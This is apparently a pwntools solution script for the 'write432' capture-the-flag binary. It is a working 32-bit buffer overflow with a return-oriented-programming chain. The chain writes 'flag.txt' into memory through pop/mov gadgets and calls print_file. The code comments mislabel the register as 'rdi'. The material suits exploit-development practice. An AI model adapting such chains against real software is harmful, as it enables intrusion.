

from pwn import *
context.bits=32

overwrite = b'A'*44
printfile = p32(0x080483d0)
freespace = p32(0x0804a018)
freespace2 = p32(0x804A01C)
mov = p32(0x08048543)
pop = p32(0x080485aa)

#rdi = freespace -> first
#rdi = "string flag.txt"

payload = overwrite + pop + freespace + b'flag' + mov 
payload += pop + freespace2 + b'.txt' + mov 
payload += printfile +b"AAAA"+freespace

p = process("./write432")
p.send(payload)
p.interactive()


